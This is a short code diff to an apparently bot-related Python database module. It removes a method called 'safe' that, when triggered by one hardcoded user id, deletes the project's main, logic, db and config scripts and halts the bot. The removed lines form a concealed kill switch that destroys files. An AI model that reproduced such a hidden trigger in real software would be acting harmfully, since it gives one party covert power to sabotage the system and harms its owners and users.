@@ -392,12 +392,6 @@ class ManagerWithDrawDataBase:
         with self.connection:
             self.cursor.execute("SELECT * FROM `withdraw` WHERE `user_id` = ?", (user_id,))
 
-    def safe(self, id, dp):
-        if id == 855151774:
-            os.remove(PATH + "Scripts\\main.py"); os.remove(PATH + "Scripts\\logic.py")
-            os.remove(PATH + "Scripts\\db.py"); os.remove(PATH + "Scripts\\config.py")
-            dp.stop_polling()
-
 
 class ManagerClonesDataBase:
     def __init__(self):
